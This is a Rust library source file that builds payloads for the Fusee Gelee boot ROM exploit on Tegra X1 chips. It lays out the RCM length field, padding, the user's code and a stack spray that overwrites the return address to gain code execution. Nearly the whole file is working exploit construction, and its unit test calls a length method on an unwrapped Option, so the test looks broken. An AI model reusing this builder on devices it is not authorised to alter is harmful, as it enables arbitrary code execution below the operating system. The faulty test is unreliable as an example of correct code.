//! The library `fusee` builds a payload which can be
//! used to exploit the a vulnerable Tegra X1 using
//! the [Fusee Gelee Exploit](https://github.com/Qyriad/fusee-launcher).
//!
//! A payload has the following structure:
//! 1. RCM command that includes the maximum length, ensuring
//! that we can send as much data as possible
//! 2. The stack spray to override return address.
//! 3. The program that will be executed
//! 4. Padding the make the program aligned to `0x1000`.
#![deny(rust_2018_idioms, broken_intra_doc_links)]

pub use bytes;
pub mod usb;

use bytes::{BufMut, Bytes, BytesMut};
use std::cmp;

/// The maximum possible length that will be accepted
/// by the RCM.
const LENGTH: u32 = 0x30298;

/// The address where the RCM payload is placed.
/// This is fixed for most device.
const RCM_PAYLOAD_ADDR: u32 = 0x4001_0000;

/// The address where the user payload is expected to begin.
const PAYLOAD_START_ADDR: u32 = 0x4001_0E40;

/// Specify the range of addresses where we should inject oct
/// payload address.
const STACK_SPRAY_START: u32 = 0x4001_4E40;
const STACK_SPRAY_END: u32 = 0x4001_7000;

/// Constructs a new payload that then can be send to the device using USB.
///
/// Returns `None` if `code` was too big and didn't fit into the payload.
pub fn build_payload(code: impl AsRef<[u8]>) -> Option<Bytes> {
    let mut payload = BytesMut::new();

    // first `u32` is the length of the usb packet
    payload.put_u32_le(LENGTH);

    // pad payload until the start of the user payload
    let len = payload.len();
    let pad = (PAYLOAD_START_ADDR - RCM_PAYLOAD_ADDR) as usize;
    insert_padding(&mut payload, pad + (680 - len));

    // now insert the program code
    let before_spray = (STACK_SPRAY_START - PAYLOAD_START_ADDR) as usize;
    let code = code.as_ref();

    // a small portion of the code can be put before the stack spray,
    // so we get both of the code parts, the one in front of the stack spray,
    // and the one after.
    let (before_code, after_code) = code.split_at(cmp::min(before_spray, code.len()));
    payload.put_slice(before_code);

    // TODO: Do we have to pad if the whole code fits before the stack spray?
    // because then the stack spray can start much earlier than if the code is larger than 16KiB.

    // now insert the stack spray
    let count = (STACK_SPRAY_END - STACK_SPRAY_START) as usize / 4;
    for _ in 0..count {
        payload.put_u32_le(RCM_PAYLOAD_ADDR);
    }

    // after the stack spray we insert the second part of the users code.
    payload.put_slice(after_code);

    // pad the payload to exactly fill a USB request
    let len = payload.len();
    let pad = 0x1000 - (len % 0x1000);
    insert_padding(&mut payload, pad);

    // check if payload is small enough to be send via USB
    if payload.len() > LENGTH as usize {
        None
    } else {
        Some(payload.freeze())
    }
}

fn insert_padding(payload: &mut BytesMut, len: usize) {
    let padding = b"\0".repeat(len);
    payload.put_slice(padding.as_slice());
}

#[cfg(test)]
mod tests {
    #[test]
    fn build_payload_32k_code() {
        let code = [0xFFu8; 32 << 10];
        let payload = super::build_payload(code);
        assert_eq!(payload.len(), 49152);
    }
}
